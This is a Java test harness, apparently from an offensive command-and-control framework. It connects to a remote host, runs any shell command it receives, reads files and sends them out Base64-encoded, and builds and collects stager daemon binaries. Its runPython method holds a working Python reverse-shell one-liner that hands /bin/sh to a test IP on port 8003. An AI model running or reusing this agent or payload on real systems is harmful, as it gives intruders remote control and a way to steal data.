package c2.remote;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import util.Time;
import util.test.OutputStreamWriterHelper;
import util.test.TestConstants;

public class RemoteTestExecutor {

	private ExecutorService service = Executors.newFixedThreadPool(4);

	private static final String[] DAEMON_NAMES = { "http_daemon.exe", "dns_daemon.exe", "imap_daemon.exe" };
	private static final String REMOTE_PRODUCTS_DIRECTORY = "/home/kali/dev/TheAllCommanderPrivate/agents/stager/daemon/cross-compile";

	private static final String CMD_READFILE = "readfile";
	private static final String CMD_EXECUTE_SHELL = "bc";
	public static final String CMD_EXECUTE_PYTHON = "python_oneliner";
	private static final String CMD_QUIT = "quit";

	private static final String MSG_INITIAL_SERVER = "Awaiting Orders";
	private static final String MSG_COMMAND_COMPLETE = "Command complete";
	private static final String MSG_PROCESS_EXECUTE = "Process execute";

	public static void main(String args[]) {
		String host = args[0];
		int port = Integer.parseInt(args[1]);
		RemoteTestExecutor exec = new RemoteTestExecutor();
		exec.runTestServer(host, port);
	}

	public boolean startTestProgram(int port, String startCmd) {

		try (ServerSocket ss = new ServerSocket(port)) {
			ss.setSoTimeout(5000);

			Socket newSession = ss.accept();

			try {
				OutputStreamWriter bw = new OutputStreamWriter(new BufferedOutputStream(newSession.getOutputStream()));
				BufferedReader br = new BufferedReader(new InputStreamReader(newSession.getInputStream()));

				Time.sleepWrapped(1000);

				if (br.ready()) {
					System.out.println("Reading");
					String input = br.readLine();
					System.out.println(input);

					bw.write(startCmd + System.lineSeparator());
					bw.flush();

					input = br.readLine();
					System.out.println(input);
				} else {
					System.out.println("This guy isn't talking to us");
					newSession.close();
				}

			} catch (IOException e) {
				e.printStackTrace();
				newSession.close();
				return false;
			}

			return true;
		} catch (IOException ex) {
			System.out.println("Remote tester not available");
			return false;
		}
	}

	public boolean executeBuildAndReceiveProducts(int port) {
		try (ServerSocket ss = new ServerSocket(port)){
			ss.setSoTimeout(5000);

			Socket newSession = ss.accept();

			try {
				OutputStreamWriter bw = new OutputStreamWriter(new BufferedOutputStream(newSession.getOutputStream()));
				BufferedReader br = new BufferedReader(new InputStreamReader(newSession.getInputStream()));

				Time.sleepWrapped(1000);

				if (br.ready()) {
					String input = br.readLine();
					if (!input.equalsIgnoreCase(MSG_INITIAL_SERVER)) {
						System.out.println("Did not get initial server hail, returning");
						return false;
					}
					// Checkout correct directory
					OutputStreamWriterHelper.writeAndSend(bw, CMD_EXECUTE_SHELL + " cd ../TheAllCommanderPrivate && git pull");
					input = br.readLine();
					if (!input.equalsIgnoreCase(MSG_PROCESS_EXECUTE)) {
						System.out.println("Could not confirm git pull make, returning");
						return false;
					}
					input = br.readLine();
					if (!input.equalsIgnoreCase(MSG_COMMAND_COMPLETE)) {
						System.out.println("Could not execute git pull, returning");
						return false;
					}
					// Make products
					OutputStreamWriterHelper.writeAndSend(bw, CMD_EXECUTE_SHELL + " cd ../TheAllCommanderPrivate/agents/stager/daemon/cross-compile/ && make");
					input = br.readLine();
					if (!input.equalsIgnoreCase(MSG_PROCESS_EXECUTE)) {
						System.out.println("Could not confirm make execution, returning");
						return false;
					}
					input = br.readLine();
					if (!input.equalsIgnoreCase(MSG_COMMAND_COMPLETE)) {
						System.out.println("Could not execute make, returning");
						return false;
					}
					Files.createDirectories(Paths.get("agents", "build"));
					for (String daemon : DAEMON_NAMES) {
						// Make products
						OutputStreamWriterHelper.writeAndSend(bw,
								CMD_READFILE + " " + REMOTE_PRODUCTS_DIRECTORY + "/" + daemon);
						input = br.readLine();
						System.out.println("Received: " + input.length());
						byte[] data = Base64.getDecoder().decode(input);
						Files.write(Paths.get("agents", "build", daemon), data);
					}
					OutputStreamWriterHelper.writeAndSend(bw,
							CMD_QUIT);
				} else {
					System.out.println("This guy isn't talking to us");
					newSession.close();
					return false;
				}

			} catch (IOException e) {
				//e.printStackTrace();
				newSession.close();
				return false;
			}

		} catch (IOException ex) {
			//ex.printStackTrace();
			return false;
		}
		return true;
	}

	public void runTestServer(String host, int port) {
		while (true) {
			try {
				System.out.println("Attempting contact");
				Socket remote = new Socket(host, port);
				System.out.println("Contact!!!");
				OutputStreamWriter bw = new OutputStreamWriter(new BufferedOutputStream(remote.getOutputStream()));
				BufferedReader br = new BufferedReader(new InputStreamReader(remote.getInputStream()));
				OutputStreamWriterHelper.writeAndSend(bw, MSG_INITIAL_SERVER);
				while (true) {
					String input = br.readLine();
					System.out.println("Working on command: " + input);
					if(input == null) {
						Time.sleepWrapped(500);
						continue;
					}
					if (input.startsWith(CMD_READFILE)) {
						String fileToRead = input.substring(CMD_READFILE.length() + 1);
						byte[] file = Files.readAllBytes(Paths.get(fileToRead));
						String fileStr = Base64.getEncoder().encodeToString(file);
						System.out.println("Sending a file of length: " + fileStr.length());
						OutputStreamWriterHelper.writeAndSend(bw, fileStr);
					}else if(input.equals(CMD_EXECUTE_PYTHON)) {
						runPython(bw);
						OutputStreamWriterHelper.writeAndSend(bw, MSG_COMMAND_COMPLETE);
					} else if (input.startsWith(CMD_EXECUTE_SHELL)) {
						String commandToExe =input.substring(CMD_EXECUTE_SHELL.length() + 1);
						System.out.println("Executing: " + commandToExe);
						runCommand(bw, commandToExe);
						
						OutputStreamWriterHelper.writeAndSend(bw, MSG_COMMAND_COMPLETE);
					} else if (input.equals(CMD_QUIT)) {
						break;
					} else {
						runCommand(bw, input);
						break;
					}
				}
				remote.close();
			} catch (IOException ex) {
				ex.printStackTrace();
			}catch(InterruptedException ex) {
				//Ignore
			} catch (ExecutionException e) {
				e.printStackTrace();
			} finally {
				Time.sleepWrapped(1000);
			}
		}
	}
	
	private void runPython(OutputStreamWriter bw) throws IOException, InterruptedException, ExecutionException{
		String[] command = {"python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + TestConstants.PORT_FORWARD_TEST_IP_LINUX +  "\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);"};
		System.out.println("Running command: " + command);
		Runnable runner2 = new Runnable() {
			@Override
			public void run() {
				try {
					Process process = Runtime.getRuntime().exec(command);
					process.waitFor();
					//System.out.println(new String(process.getErrorStream().readAllBytes()));
					//System.out.println(new String(process.getInputStream().readAllBytes()));
				} catch (IOException | InterruptedException e) {
					e.printStackTrace();
				}

			}
		};
		Future<?> exe = service.submit(runner2);
		OutputStreamWriterHelper.writeAndSend(bw, MSG_PROCESS_EXECUTE);
		exe.get();
	}
	
	private void runCommand(OutputStreamWriter bw, String command) throws IOException, InterruptedException, ExecutionException{
		System.out.println("Running command: " + command);
		Runnable runner2 = new Runnable() {
			@Override
			public void run() {
				try {
					Process process = Runtime.getRuntime().exec(command);
					process.waitFor();
				} catch (IOException | InterruptedException e) {

				}

			}
		};
		Future<?> exe = service.submit(runner2);
		OutputStreamWriterHelper.writeAndSend(bw, MSG_PROCESS_EXECUTE);
		exe.get();
	}
}
